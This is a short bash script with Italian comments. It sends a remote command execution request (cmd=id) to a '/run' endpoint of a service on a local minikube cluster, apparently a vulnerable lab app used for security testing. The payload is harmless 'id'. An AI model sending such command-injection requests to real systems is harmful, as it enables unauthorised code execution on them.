#!/bin/bash
TARGET=http://$(minikube ip):30080
echo "[*] Eseguo 'id' via RCE"
curl "$TARGET/run?cmd=id"
